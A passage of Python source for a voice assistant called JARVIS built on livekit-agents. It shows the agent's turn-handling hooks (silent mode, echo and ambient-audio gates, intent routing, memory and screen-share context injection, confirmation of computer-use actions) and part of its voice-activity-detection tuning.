        from pipeline.turn_telemetry import CONFAB_STATE_RETRY_EXCEPTION
        try:
            session.say(NO_TEXT_FILLER_TEXT, allow_interruptions=True)
        except Exception:
            pass
        try:
            session._jarvis_confab_check_state = CONFAB_STATE_RETRY_EXCEPTION
        except Exception:
            pass
        return

    # Voice the result (clean text or filler — both end up here).
    if result.text:
        try:
            session.say(result.text, allow_interruptions=True)
        except Exception as _e:
            logger.debug(f"[text-recovery] say failed: {_e}")

    # Stash telemetry. log_turn reads _jarvis_confab_check_state directly.
    try:
        session._jarvis_confab_check_state = result.telemetry_state
        session._jarvis_confab_pattern_matched = result.pattern_matched
        session._jarvis_confab_retry_models = list(result.models_tried)
    except Exception:
        pass

    logger.info(
        f"[text-recovery] route={route} tier={result.tier_passed!r} "
        f"state={result.telemetry_state} model={result.model_id}"
    )


# Barge-in truncation helpers — extracted to pipeline/barge_in.py
# 2026-05-10 (Step 9 of the audit). Re-exported under legacy
# underscored names so existing tests + the providers/tts.py lazy
# import + the entrypoint barge-in call sites stay untouched.
from pipeline.barge_in import (
    GROQ_ORPHEUS_BYTES_PER_MS as _GROQ_ORPHEUS_BYTES_PER_MS,
    flatten_chat_content      as _flatten_chat_content,
    record_synthesis          as _record_synthesis,
    truncate_to_heard_portion as _truncate_to_heard_portion,
)


# ── Agent subclass: silent-mode gating ─────────────────────────────────
#
# The framework's base `Agent` always forwards the user's transcript
# to the LLM. We override `on_user_turn_completed` to:
#   - Drop the turn entirely (raise StopResponse) if silent mode is
#     active and the user didn't say a wake-up phrase. JARVIS stays
#     quiet, no LLM call, no TTS.
#   - Toggle silent mode on/off based on detected mute/wake phrases.
#     Wake phrases pass through to the LLM so it can voice a brief
#     "I'm back" acknowledgment; mute phrases also pass through so
#     it can voice "going silent" once before suppressing.
class JarvisAgent(Agent):
    # Subagent handoffs (transfer_to_desktop, transfer_to_planner, …)
    # are now supplied via the `subagents/` registry — see
    # `build_all_transfer_tools()` in the JarvisAgent instantiation
    # below. Adding a new subagent is one file under subagents/,
    # one register() call, no edits here.
    #
    # The legacy class-method `transfer_to_desktop` was removed in
    # Phase 4 of the registry migration (2026-04-30); the registry's
    # RegistrySubagent + DESKTOP_INSTRUCTIONS reproduces it 1:1.

    async def on_enter(self) -> None:
        # Base Agent.on_enter is a no-op pass; preserve the contract.
        await super().on_enter()
        # Begin the cloud MemoryProvider session (no-op when the layer is
        # off — JARVIS_MEMORY_PROVIDER unset → active_provider() is None).
        # Session id = the room name (same id source as `ctx.room.name`
        # used elsewhere in this file); stable per job. Guarded so a
        # memory-layer hiccup never blocks agent entry.
        try:
            from pipeline import memory_provider
            room = getattr(getattr(self.session, "room_io", None), "room", None)
            session_id = getattr(room, "name", "") or ""
            memory_provider.begin_session(session_id)
        except Exception as e:  # noqa: BLE001 — memory must never break entry
            logger.debug(f"[memory] begin_session skipped: {e}")
        # Begin the conversation persistence session (~/.jarvis/conversations.db).
        try:
            from pipeline import conversation_store
            sid = getattr(self.session, "_jarvis_convo_session_id", None)
            if sid:
                conversation_store.begin_session(sid)
        except Exception as e:  # noqa: BLE001 — persistence must never break entry
            logger.debug(f"[conversation] begin_session skipped: {e}")

    async def on_exit(self) -> None:
        # End the cloud MemoryProvider session (no-op when the layer is off).
        try:
            from pipeline import memory_provider
            memory_provider.end_session()
        except Exception as e:  # noqa: BLE001 — memory must never break exit
            logger.debug(f"[memory] end_session skipped: {e}")
        # End the conversation persistence session.
        try:
            from pipeline import conversation_store
            sid = getattr(self.session, "_jarvis_convo_session_id", None)
            if sid:
                conversation_store.end_session(sid)
        except Exception as e:  # noqa: BLE001 — persistence must never break exit
            logger.debug(f"[conversation] end_session skipped: {e}")
        # Base Agent.on_exit is a no-op pass; preserve the contract.
        await super().on_exit()

    def stt_node(self, audio, model_settings):
        """Tee mic frames into the partial barge-in tap (2026-07-02).

        The tap's first transport — a second rtc.AudioStream on the mic
        track — STARVED after ~1 s live (first frames arrive, then the
        task parks in `async for` forever). The STT feed is the one
        audio path proven to flow continuously (it feeds whisper all
        day), so the tap rides it: `feed_frame` only enqueues (bounded,
        drop-on-overflow) and recognition happens in the tap's worker —
        zero added latency on the transcription path.
        """
        tap = getattr(self.session, "_jarvis_partial_bargein_tap", None)
        if tap is None:
            return super().stt_node(audio, model_settings)

        async def _teed():
            async for frame in audio:
                tap.feed_frame(frame)
                yield frame

        return super().stt_node(_teed(), model_settings)

    async def llm_node(self, chat_ctx, tools, model_settings):
        """Vision-feedback loop (P2a): before generating, inject the post-action
        screen (pixels for a vision-capable model, else a text description) into
        THIS generation's chat_ctx copy. Ephemeral — never persists to history.
        Best-effort: any failure just skips injection and generates normally.

        Known degraded edge (deferred to P2c): the gate decides on the route's
        PRIMARY model. If that primary is vision-capable (pixels injected) but the
        FallbackAdapter then cascades to a text-only rung (Groq llama-3.x) because
        the primary errored, the ImageContent rides along and that rung
        ignores/rejects it (wasted tokens). Rare — the primary had to fail first.
        Hardening (strip ImageContent on the text-only rung) is a P2c follow-up."""
        try:
            from pipeline import computer_use_vision as _cuv
            cap = _cuv.take_current()
            if cap is not None:
                mode = _cuv.decide_mode(getattr(self, "_dispatch_llm", None))
                desc = None
                if mode == "text":
                    try:
                        from pipeline.screen_share_observer import latest_description_global
                        desc = latest_description_global()
                    except Exception:
                        desc = None
                inj = _cuv.build_injection(cap=cap, mode=mode, desc=desc,
                                           dispatch_llm=getattr(self, "_dispatch_llm", None))
                if inj is not None:
                    role, content = inj
                    chat_ctx.add_message(role=role, content=content)
                    logger.info("[vision] injected post-action screen "
                                "(mode=%s, label=%s)", mode, cap.get("action_label"))
        except Exception:
            logger.debug("[vision] injection skipped", exc_info=True)

        # Vision TOOL for a text-only brain (the P2c follow-up, done): when the
        # route model can't see (decide_mode == "text" — e.g. DeepSeek/Groq/Kimi
        # default), describe any images in THIS generation's ctx out-of-band via
        # Gemini so a text-only supervisor can actually talk about them, instead
        # of dropping/choking. Cached; best-effort — failures fall through to
        # image_content_strip's placeholder, so it never bricks the turn.
        try:
            from pipeline import computer_use_vision as _cuv_mode
            if _cuv_mode.decide_mode(getattr(self, "_dispatch_llm", None)) == "text":
                from pipeline import image_describe as _imd
                _n_desc = await _imd.describe_ctx_images(chat_ctx)
                if _n_desc:
                    logger.info("[vision] described %d ctx image(s) for the "
                                "text-only supervisor", _n_desc)
        except Exception:
            logger.debug("[vision] ctx-image describe skipped", exc_info=True)

        async for chunk in Agent.default.llm_node(self, chat_ctx, tools, model_settings):
            yield chunk

    async def on_user_turn_completed(
        self, turn_ctx: ChatContext, new_message: ChatMessage,
    ) -> None:
        # Vision-feedback loop (P2a): a new user turn invalidates any cached
        # post-action screen so it can't bleed into an unrelated turn.
        try:
            from pipeline import computer_use_vision
            computer_use_vision.clear()
        except Exception:
            pass
        # Computer-use safety-confirm channel: if the subagent is
        # waiting on a user yes/no, parse the transcript and resolve
        # its Future. Don't continue normal turn processing — the
        # subagent owns the floor until it task_done's.
        cua_fut = getattr(self.session, "_cua_confirm_future", None)
        if cua_fut is not None and not cua_fut.done():
            transcript = ""
            try:
                transcript = (new_message.text_content() or "").strip().lower()
            except Exception:
                pass
            yes = transcript in {"yes", "y", "yeah", "yep", "go", "go ahead",
                                  "proceed", "do it", "ok", "okay", "confirmed"}
            no = transcript in {"no", "n", "nope", "stop", "cancel", "don't",
                                 "skip", "abort", "wait", "hold on"}
            if yes:
                cua_fut.set_result(True)
                return
            if no:
                cua_fut.set_result(False)
                return
            # Ambiguous — treat as no (default-deny per spec §6.D).
            cua_fut.set_result(False)
            return

        # Spec 2026-05-24, Track 2.5 — handle confirmation of pending procedure offer.
        # Runs BEFORE transcript extraction so we can short-circuit on yes/no.
        try:
            room = getattr(getattr(self.session, "room_io", None), "room", None)
            room_id = getattr(room, "name", "default")
            pending = _PENDING_PROCEDURE_OFFERS.get(room_id)
            if pending and (time.time() - pending["ts"]) > 60.0:
                # 60s expiry — discard stale offer
                _PENDING_PROCEDURE_OFFERS.pop(room_id, None)
                pending = None
            if pending:
                # Get user text quickly via new_message.text_content() — same
                # extraction the rest of the method does, just early.
                try:
                    user_text_for_confirm = (new_message.text_content() or "").strip()
                except Exception:
                    user_text_for_confirm = ""
                if _is_procedure_confirmation(user_text_for_confirm):
                    name = pending["name"]
                    user_text_orig = pending.get("user_text", "")
                    jarvis_text_orig = pending.get("jarvis_text", "")
                    _PENDING_PROCEDURE_OFFERS.pop(room_id, None)
                    # Build a steps body from the trajectory. We don't have
                    # the actual tool-call list at this stage, so derive a
                    # narrative-shape body from the jarvis_text reply. The
                    # supervisor can later refine via memory(replace, ...).
                    steps_body = (
                        f"Trajectory captured from successful task:\n"
                        f"User request: {user_text_orig[:200]}\n"
                        f"JARVIS completion: {jarvis_text_orig[:300]}"
                    )
                    try:
                        from tools.memory import _handle_memory
                        _handle_memory({
                            "action": "add", "target": "procedure",
                            "name": name,
                            "content": steps_body,
                        })
                        logger.info(
                            "[procedure] applied: name=%s source=user_confirm", name
                        )
                        try:
                            await self.session.say(f"Saved as {name}.")
                        except Exception:
                            pass
                    except Exception as _ae:
                        logger.warning("[procedure] apply failed: %s", _ae)
                    return  # consume this turn, don't run supervisor
        except Exception as e:
            logger.warning("[procedure] confirmation handler failed: %s", e)

        # Pull the transcript however we can — different livekit-agents
        # versions stash it in slightly different places. Try the
        # canonical text_content() first; fall back to digging through
        # content list element by element.
        raw = ""
        try:
            tc = new_message.text_content()
            if tc:
                raw = tc
        except Exception:
            pass
        if not raw:
            try:
                content = getattr(new_message, "content", None)
                if isinstance(content, str):
                    raw = content
                elif isinstance(content, list):
                    parts = []
                    for c in content:
                        if isinstance(c, str):
                            parts.append(c)
                        else:
                            # Some plugins wrap text in objects with a .text
                            # or .content attribute. Try both before giving
                            # up.
                            t = getattr(c, "text", None) or getattr(c, "content", None)
                            if isinstance(t, str):
                                parts.append(t)
                    raw = " ".join(parts)
            except Exception:
                pass
        text = (raw or "").lower().strip()
        if not text:
            return

        # ── STT-confidence gate ────────────────────────────────────────
        # Drop obvious-garbage transcripts BEFORE waking the LLM —
        # cheaper and less ambiguous than the post-LLM hedge filter
        # that used to do this and ate legitimate replies. Only the
        # most obvious noise patterns trip this (single-token fillers
        # like 'uh' / 'hmm', repeated stutter, pure punctuation).
        # Wake-vocative shapes like 'jarvis' / 'hey jarvis' aren't in
        # the filler set so they pass through to the bare-vocative
        # fast-path below as before.
        is_garbage, gr = _is_garbage_transcript(text)
        if is_garbage:
            logger.info(f"[stt-gate] dropped: {text[:80]!r} reason={gr}")
            raise StopResponse()

        # Echo-aware barge-in (2026-05-20): with a hot mic during TTS, a
        # finalized "user turn" may be JARVIS's own speech echoing back. Drop
        # it so echo never becomes a phantom request. Only matches within
        # RECENT_SPEECH_TTL of speech end (else recent_speaking_text() is "").
        drop_echo = False
        try:
            from pipeline import echo_gate, speaking_tracker
            drop_echo = echo_gate.enabled() and echo_gate.is_echo(
                text, speaking_tracker.recent_speaking_text(2.0)
            )
        except Exception as e:
            logger.debug(f"[echo-gate] turn check skipped: {e}")
        if drop_echo:
            logger.info(f"[echo-gate] dropped phantom echo-turn: {text[:80]!r}")
            raise StopResponse()

        if _is_silent():
            # Silent mode: only the wake-up family unblocks JARVIS.
            # Use _is_command (length-bounded) instead of bare substring
            # matching so "you don't have to wake up" — a topical
            # mention in a long sentence — doesn't count as a wake.
            if _is_command(text, _WAKE_PATTERNS):
                _set_silent(False)
                logger.info(
                    f"[silent-mode] wake phrase detected → exiting silent mode "
                    f"(trigger: {text[:120]!r})"
                )
                # Fall through so the LLM voices a quick "I'm back".
                return
            # Anything else while silent → drop turn, no reply.
            logger.info(f"[silent-mode] suppressed turn: {text[:60]!r}")
            raise StopResponse()

        # Not silent. Check for mute trigger.
        if _is_command(text, _MUTE_PATTERNS):
            _set_silent(True)
            # Log the actual trigger phrase so false positives can be
            # diagnosed. Without this we only see "entering silent mode"
            # and have to guess what the matcher caught.
            logger.info(
                f"[silent-mode] mute phrase detected → entering silent mode "
                f"(trigger: {text[:120]!r})"
            )
            # Don't drop — let the LLM voice a brief "going silent"
            # so the user gets confirmation. Future turns will be
            # suppressed by the silent-mode branch above.
            return

        # Quiet-hours gate. During 11pm–7am, drop turns that have no
        # "Jarvis" vocative AND no recent real interaction. This catches
        # idle 3am ambient noise (Spotify/Chrome opened while sleeping)
        # while preserving normal multi-turn conversation: once the user
        # says "Jarvis, X", follow-up turns within 5 minutes pass freely.
        # Addressing gate (2026-06-25): JARVIS answers only when ADDRESSED — by
        # the "Jarvis" vocative, an explicit wake phrase, or an active
        # conversation (a recent interaction within the engagement window).
        # Otherwise the turn is ambient room audio — the user talking to someone
        # else, a TV, footsteps as they walk past — and is dropped silently
        # rather than answered with a continuer ("Go on." / "I'm here"). Before
        # this the gate was quiet-hours-only AND quiet hours defaulted OFF, so
        # JARVIS answered ALL ambient 24/7 (user 2026-06-25: "responds when I
        # walk by, not addressed to me"). Kill-switch: JARVIS_ADDRESSING_GATE=0.
        if _is_unaddressed_ambient(text):
            logger.info(
                f"[addressing-gate] dropping ambient turn (not addressed): "
                f"{text[:80]!r}"
            )
            raise StopResponse()

        # Turn accepted — stamp the interaction time so follow-ups within
        # the quiet-hours window don't need a vocative.
        _touch_interaction()

        # Stash the accepted transcript for reply-side gates (the ambient-
        # backchannel suppressor reads it off the telemetry session ref).
        # Vocative/wake turns also warm the addressed-window stamp here so
        # _turn_is_addressed doesn't depend on the memory-sync path being
        # live (idempotent with _should_sync_memory_item's touch).
        try:
            self.session._jarvis_last_user_text = text
        except Exception:
            pass
        if _JARVIS_NAME_RE.search(text) or _is_command(text, _WAKE_PATTERNS):
            _touch_addressed()

        # Auto-title the conversation session from the first user utterance.
        # The store's auto_title() enforces first-writer-wins (WHERE title
        # IS NULL), so this is idempotent across retries and edge cases.
        try:
            from pipeline import conversation_store
            sid = getattr(self.session, "_jarvis_convo_session_id", None)
            turn_n = int(getattr(self.session, "_jarvis_turn_count", 0))
            if sid and turn_n == 0:
                # turn_count is still 0 here (not yet incremented by the
                # dispatcher), so this fires on the very first utterance.
                raw_title = raw.strip()[:100] if raw else text[:100]
                if raw_title:
                    conversation_store.auto_title(sid, raw_title)
        except Exception:
            pass

        # Short-input ambiguity gate. Inverted 2026-05-10: the gate now
        # uses a small explicit blocklist of known confab-trigger
        # utterances ("hush" / "one sec" / "whatever" / "maybe" / etc.)
        # rather than the previous broad "deflect-unless-bypassed"
        # approach which kept producing false positives on legit short
        # inputs (greetings, Whisper variants, foreign words, etc.).
        # See pipeline/short_input_gate.py for the trigger list and
        # design rationale.
        if _is_ambiguous_short_input(text):
            logger.info(
                f"[short-input-gate] deflecting ambiguous short input: {text[:60]!r}"
            )
            self.session.say("Pardon?", allow_interruptions=True)
            raise StopResponse()

        # Deterministic intent router (added 2026-05-11 evening).
        # High-confidence voice commands match a regex, fire the
        # tool sequence directly, and bypass the supervisor LLM.
        # Removes the LLM from the failure path for the common
        # voice-controlled actions ("share my screen", "stop sharing",
        # "what's on my screen?"). See pipeline/intent_router.py for
        # the registry. Exceptions from any executor MUST NOT block
        # the user's turn — caught here and falls through to the LLM.
        try:
            from pipeline.intent_router import match as _match_intent
            intent = _match_intent(text)
        except Exception as e:
            intent = None
            logger.warning(
                f"[intent-router] match failed: {type(e).__name__}: {e}"
            )
        if intent is not None:
            try:
                await intent.executor()
            except Exception as e:
                logger.warning(
                    f"[intent-router] {intent.name} executor failed: "
                    f"{type(e).__name__}: {e} — falling through to LLM"
                )
                intent = None
        if intent is not None and intent.short_circuit:
            logger.info(
                f"[intent-router] short-circuit {intent.name} "
                f"(reply={intent.reply!r})"
            )
            self.session.say(intent.reply, allow_interruptions=True)
            raise StopResponse()
        # Non-short-circuit intents have already fired their side
        # effects; fall through so the LLM can produce its verbal reply
        # with the world state already mutated (e.g. for SCREEN_SHARE_QUERY
        # the share is on by the time the LLM picks the transfer tool).

        # Memory writes are DELIBERATE, not auto-extracted. The supervisor
        # decides what's worth keeping via the `memory` tool (tools.memory →
        # pipeline.file_memory); the frozen MEMORY.md + USER.md snapshot is
        # injected into the prompt at session start. Avoids the auto-extract
        # garbage failure mode (LLM-meta narration like "The user is asking
        # about X" polluting the store). No per-turn memory side effect
        # fires here.

        # Bare-vocative fast path. When the user just calls JARVIS by name
        # (with optional preamble like "hey", "yo", "okay", "i said"),
        # voice the canonical "Yes?" directly via session.say() and
        # skip the LLM call. Why: LLM round-trip + endpointing adds 2-3 s
        # of latency. The user thinks the first call wasn't heard and says
        # it again. Fast path drops latency to ~TTS synth time only.
        #
        # Accepted patterns (the regex below tightly bounds these):
        #   "jarvis" / "Jarvis." / "Jarvis?"
        #   "hey jarvis" / "yo jarvis" / "ok jarvis"
        #   "i said jarvis" / "okay jarvis"
        # Rejected (deferred to LLM):
        #   "jarvis open the browser"  — actual command after name
        #   "jarvis what time is it"   — actual question
        if _BARE_VOCATIVE_RE.match(text):
            # Fire-and-forget: schedule the say() as a background task and
            # return from this handler IMMEDIATELY via StopResponse. If we
            # `await session.say(...)` here, the handler blocks until the
            # whole utterance is queued/synthesized, during which the
            # framework can't process the user's NEXT turn — leading to
            # the "I said something after 'Yes?' and JARVIS didn't
            # answer" symptom (verified 2026-04-30 08:03 — fast-path fired
            # but next user turn never reached on_user_turn_completed).
            try:
                # `session.say(…)` in livekit-agents 1.5+ returns a
                # SpeechHandle synchronously and dispatches the
                # synthesis on its own task internally — wrapping it
                # in asyncio.create_task() raises "a coroutine was
                # expected, got SpeechHandle". Calling it directly
                # gives the same fire-and-forget behaviour we want
                # (control returns immediately; synthesis runs in the
                # background; next user turn isn't blocked).
                self.session.say("Yes?", allow_interruptions=True)
                logger.info(f"[bare-vocative] fast-path 'Yes?' (heard: {text!r})")
                raise StopResponse()
            except StopResponse:
                raise
            except Exception as e:
                logger.warning(f"[bare-vocative] fast-path failed: {e}; falling through to LLM")
                # Fall through to LLM — no `return`, let the framework
                # invoke the LLM with the bare-vocative as it would have
                # before this fast path existed.

        # Phase 3 (Task 12 consumer) — forward the forced tool_choice that
        # _on_user_input_for_dispatch set on this turn into the LiveKit
        # activity so the upcoming _generate_reply call picks it up.
        # _on_user_input_for_dispatch already runs before on_user_turn_completed
        # (user_input_transcribed fires on final STT; on_user_turn_completed runs
        # at end-of-turn after STT completes), so _jarvis_force_tool_choice is
        # already set/reset by the time we reach here.
        #
        # We write to session._activity._tool_choice via update_options() — the
        # same field that agent_activity.py:_generate_reply reads at line 2028.
        # This is the only path that leads to _generate_reply; all other exits
        # above raise StopResponse (no LLM call, no update needed).
        try:
            _forced_tc = getattr(session, "_jarvis_force_tool_choice", None)
            _activity = getattr(session, "_activity", None)
            if _activity is not None:
                _activity.update_options(tool_choice=_forced_tc)
                if _forced_tc is not None:
                    logger.info(
                        "[recall-route] tool_choice forwarded to activity: "
                        f"{_forced_tc!r}"
                    )
        except Exception as _tc_err:
            # Never block the LLM call for a tool_choice wiring failure.
            logger.debug(f"[recall-route] update_options failed: {_tc_err}")

        # T12 (2026-05-19) — surface the gate's handoff-refused signal
        # to the LLM so the POST-HANDOFF HONESTY rule is actionable.
        # T8 set `session._jarvis_last_handoff_refused` when the
        # subagent gate refused task_done; T9 added the prompt rule
        # that says "hedge when the flag is true"; this call injects a
        # synthetic system message describing the situation so the
        # supervisor LLM can read it on its next chat() invocation.
        # Single-shot: the injector clears the flag after appending.
        #
        # IMPORTANT: pass `turn_ctx` (the mutable copy the framework
        # hands to this hook for exactly this purpose — see
        # livekit/agents/voice/agent_activity.py:2014-2022) NOT
        # `self.chat_ctx` (a _ReadOnlyChatContext whose .items
        # is an _ImmutableList that raises on .append()).
        try:
            inject_handoff_refused_marker(self.session, turn_ctx)
        except Exception as _t12_err:
            logger.warning(
                f"[t12] inject_handoff_refused_marker raised: "
                f"{type(_t12_err).__name__}: {_t12_err}"
            )

        # Spec 2026-05-24, Track 2.5 — procedure replay match.
        # If the user's utterance matches a saved procedure (exact name
        # substring or fuzzy ≤3 Levenshtein on any kebab chunk), inject
        # a system message with the procedure steps + a "confirm before
        # destructive" guidance line. Runs BEFORE the trigger-regex
        # inject so explicit "deploy" routes to the saved procedure
        # instead of a save trigger.
        try:
            from pipeline import file_memory
            from pipeline.prompt_builder import find_matching_procedure
            procedures = []
            for raw_entry in file_memory.read("procedure").get("entries", []) or []:
                # Parse "## name\n<body>" back into dict (best-effort)
                lines = raw_entry.split("\n")
                if not lines or not lines[0].startswith("## "):
                    continue
                p_name = lines[0][3:].strip()
                # Extract numbered steps "1. step" or treat as narrative
                steps = []
                for ln in lines[1:]:
                    m = re.match(r"^\s*\d+\.\s+(.+)$", ln)
                    if m:
                        steps.append(m.group(1).strip())
                if not steps and len(lines) > 1:
                    # Narrative body — use the joined body as a single "step"
                    body = "\n".join(lines[1:]).strip()
                    if body:
                        steps = [body]
                procedures.append({"name": p_name, "steps": steps})
            match = find_matching_procedure(raw, procedures)
            if match:
                steps_text = (
                    " → ".join(match["steps"]) if match["steps"] else "(no steps recorded)"
                )
                inject = (
                    f"Saved procedure '{match['name']}' matches the user's "
                    f"request. Steps: {steps_text}. Acknowledge the match, "
                    f"then ask the user to confirm before any destructive "
                    f"step (git push / rm / external API call). Do NOT "
                    f"execute blindly."
                )
                try:
                    turn_ctx.add_message(role="system", content=inject)
                    logger.info("[procedure] match injected: name=%s", match["name"])
                except Exception as _ie:
                    logger.debug("[procedure] match inject failed: %s", _ie)
        except Exception as e:
            logger.warning("[procedure] match step failed: %s", e)

        # Spec 2026-05-24, Track 1 — explicit save/recall trigger inject.
        # Runs after all drop/StopResponse gates and after T12 inject,
        # before the supervisor sees the turn. `raw` is the unprocessed
        # transcript (not lowercased `text`) so the regex sees natural
        # capitalisation (e.g. "Don't forget").
        # Reset unconditionally so stale value from a prior turn never
        # leaks into this turn's telemetry. Stored on `self.session` (per-turn
        # state convention) so the telemetry closure can read it.
        self.session._jarvis_turn_trigger_fired = None
        try:
            trigger_fired = _maybe_inject_trigger_message(turn_ctx, raw)
            if trigger_fired:
                self.session._jarvis_turn_trigger_fired = trigger_fired
        except Exception as e:  # noqa: BLE001 — never let trigger break the turn
            logger.warning("[trigger] inject path failed: %s", e)

        # Gated cross-session auto-recall (cheap path; never blocks — see
        # pipeline.memory_provider). Placed here — AFTER every drop /
        # StopResponse gate (CUA-confirm, garbage, echo, silent-mode,
        # quiet-hours, short-input, intent-router short-circuit,
        # bare-vocative) — so we only recall on turns that WILL reach the
        # LLM, never on dropped turns. `text` is the confirmed clean
        # transcript here. Injects into `turn_ctx` (the mutable copy the
        # framework hands this hook), same context the T12 marker above
        # writes to. No-op when the layer is off (active_provider() is None).
        try:
            from pipeline import turn_router, memory_provider
            if memory_provider.active_provider() is not None and turn_router.is_recall_query(text):
                ctx = await memory_provider.maybe_recall_for_turn(text)
                if ctx:
                    # Inject as a USER-side context message — never as
                    # "assistant", which would make the LLM attribute the
                    # recalled fact to its own prior reply (false memory of
                    # having said it). The `[context from memory]` prefix
                    # signals the source so the model treats it as retrieved
                    # background, not a fresh user utterance.
                    turn_ctx.add_message(role="user", content=f"[context from memory] {ctx}")
        except Exception as e:  # noqa: BLE001 — memory must never break a turn
            logger.debug(f"[memory] auto-recall skipped: {e}")

        # ── Conversation-store auto-recall ───────────────────────────
        # Gated same as the cloud memory provider above. When the user
        # seems to be referencing a past conversation (is_recall_query),
        # search the persisted conversation store and inject matching
        # turns as context. Uses asyncio.to_thread so the SQLite read
        # never blocks the event loop. No-op when conversations.db has
        # no prior sessions or is unavailable. Hard timeout at 1.5s.
        try:
            from pipeline import conversation_store
            if conversation_store.DEFAULT_DB_PATH.exists() and turn_router.is_recall_query(text):
                async def _convo_recall() -> str:
                    results = await asyncio.to_thread(
                        conversation_store.recall_conversation,
                        query=text,
                        limit=3,
                    )
                    if not results:
                        return ""
                    lines = [
                        f"[{r['role']}] {r['session_title']} ({r.get('ts','')[:10]}): {r['text'][:200]}"
                        for r in results[:3]
                    ]
                    return "\n".join(lines)

                ctx = await asyncio.wait_for(_convo_recall(), timeout=1.5)
                if ctx:
                    turn_ctx.add_message(
                        role="user",
                        content=f"[context from past conversations]\n{ctx}",
                    )
        except asyncio.TimeoutError:
            pass  # auto-recall timeout — turn proceeds without injected context
        except Exception as e:
            logger.debug(f"[conversation] auto-recall skipped: {e}")

        # Live screen-share awareness (2026-05-28). When the screen-share
        # observer has a fresh cached description, inject it into the
        # supervisor's chat_ctx as a system message so the supervisor
        # knows it IS watching and can answer screen questions WITHOUT
        # calling computer_use(capture) just to refresh. Without this,
        # the supervisor narrates "I take a screenshot each time you
        # ask me to look" — accurate for a tool-call-on-demand model,
        # but the observer is feeding continuous updates.
        try:
            from pipeline.screen_share_observer import latest_description
            desc = latest_description(self.session)
            if desc:
                turn_ctx.add_message(
                    role="system",
                    content=(
                        "[live screen view] ON — a continuous observer is "
                        "describing the user's shared screen. The most "
                        "recent cached description:\n"
                        f"  {desc.strip()}\n\n"
                        "Use this as ground-truth for what's currently on "
                        "the user's screen. RULES:\n"
                        "• 'are you watching?' / 'can you see?' → answer "
                        "YES, reference what's described above. NEVER say "
                        "'I take a screenshot each time' — there's a "
                        "continuous observer.\n"
                        "• 'what's on my screen?' / 'what's the video "
                        "about?' — answer from the description. Don't "
                        "call tools.\n"
                        "• ONLY call computer_use(capture) if you need "
                        "to ACT (click/type/focus). Don't call it just "
                        "to refresh your view — the observer is already "
                        "doing that.\n"
                        "• Never say 'screenshot', 'snapshot', 'pixels "
                        "aren't feeding back', or any tool-plumbing "
                        "narration. Speak as if you can simply see it."
                    ),
                )
        except Exception as e:  # noqa: BLE001 — never break a turn
            logger.debug(f"[screen-observer] inject skipped: {e}")

        # Not silent, not a mute trigger, passed quiet-hours gate → LLM.
        return


def prewarm(proc: JobProcess) -> None:
    """
    Runs once per worker process BEFORE any job. Loads the Silero VAD
    ONNX weights into RAM so they're shared across all future job
    invocations — loading is ~100 ms and the model is ~2 MB, not
    worth repeating on every connection.

    Production-grade VAD tuning (2026-05-04). Single-threshold tuning
    (just lowering activation to 0.4) was a regression: it cut soft
    first-word misses, but the looser gate let room tone through,
    Whisper turned that into " Thank you." (canonical YouTube-trained
    silence-hallucination), llama-3.1-8b-instant attempted a tool
    call on the junk transcript, Groq returned malformed-tool-call,
    breaker opened, 30 s recovery cascade. The Whisper hallucination
    filter in `_is_garbage_transcript()` is the safety net; THIS knob
    is the upstream half of the pair.

    The pattern below is what production voice systems (LiveKit,
    Pipecat, OpenAI Realtime, Google Endpointer, Vapi) actually ship:

      • Asymmetric thresholds (hysteresis). activation_threshold is
        the bar to OPEN a speech window; deactivation_threshold is
        the bar to KEEP it open. Single-threshold VAD flickers on
        plosive pauses ("...uh, J-Jarvis") and soft trailing words
        ("...what time IS it?" — final word soft) — the user gets
        cut off mid-utterance. Hysteresis lets us be strict on entry
        (no noise/breath triggers → no Whisper hallucinations) while
        being forgiving once we're confident the user is speaking.
        Silero's default gap is 0.15; we widen to 0.25 for more
        margin, matching Pipecat's `vad_stop_secs` pattern.

      • prefix_padding 0.6 s (vs 0.5 s default). The decisive trick
        for soft first words: even if VAD fires LATE on the end of
        "Jarvis", the 600 ms of audio retained BEFORE activation
        is prepended to the speech buffer, so Whisper sees the
        whole word. Big-company secret sauce: strict gate +
        generous capture > loose gate.

      • min_speech_duration 0.1 s (vs 0.05 s default). Require 100 ms
        of sustained speech-likelihood, not a single 50 ms frame.
        Filters keyboard clicks, chair scrapes, mouse buttons —
        each ~30-60 ms of high-energy noise that defaults treat as
        speech.

      • min_silence_duration 0.4 s (vs 0.55 s default). Close the
        turn 400 ms after speech ends. Tighter than default so
        endpointing doesn't feel sluggish; AgentSession's own
        endpointing min_delay (also 0.4 s) is the OR-gate above.

    Refs: github.com/livekit/agents#4761, docs.livekit.io/agents/logic/turns/vad/,
          docs.pipecat.ai/server/utilities/turn-management/user-turn-strategies,
          platform.openai.com/docs/guides/realtime-vad
    """
    # activation=0.6 (bumped from 0.5 on 2026-05-16) — user's room has
    # high ambient noise; 0.5 was triggering Whisper STT on background
    # producing hallucinated transcripts. 0.7 was too strict (missed
    # softer speech). 0.6 is the middle ground.
    #
    # 2026-05-17: thresholds env-overridable for tuning without code
    # change. Per CLAUDE.md anti-rec, don't loosen activation below
    # 0.5 except for live-debug. Set via:
    #   Environment="JARVIS_VAD_ACTIVATION_THRESHOLD=0.45"
    #   Environment="JARVIS_VAD_DEACTIVATION_THRESHOLD=0.25"
    # in ~/.config/systemd/user/jarvis-voice-agent.service.d/override.conf
    # then `systemctl --user daemon-reload && restart`.
    # All five Silero VAD params env-overridable as of 2026-05-17.
    # Defaults: original "moderate room" tuning. Noisy-environment users
    # should raise activation_threshold + min_silence_duration; quiet
    # office can leave defaults. See industry guidance: Silero VAD
    # production tuning recommends per-environment calibration since
    # one set of numbers can't fit both quiet podcast booths and laptop-
    # in-a-cafe deployments.
    # Industry-standard "balanced" preset (2026-05-17 research +
    # quiet-room correction). The five values converge across OpenAI
    # Realtime, Gemini Live, Pipecat, Vapi, and LiveKit's own
    # silero/vad.py defaults. min_speech=0.05 matches Silero's default
    # and prevents the "JARVIS cuts itself off mid-sentence" failure
    # mode (a 200ms TTS-reverb pop used to trip the interrupt path).
    # min_silence=0.70 is Vapi's anti-early-cut-in recommendation —
    # mid-sentence pauses average 400–700ms.
    #
    # activation backed off 0.6 → 0.5 same day after live silent-mic
    # incident: the "noisy room" 0.6 value over-filtered normal speech
    # in a measured-RMS-285 (quiet) room. 0.5 = OpenAI Realtime +
    # Silero default = balanced for typical rooms.
    _vad_activation = float(os.environ.get("JARVIS_VAD_ACTIVATION_THRESHOLD", "0.5"))
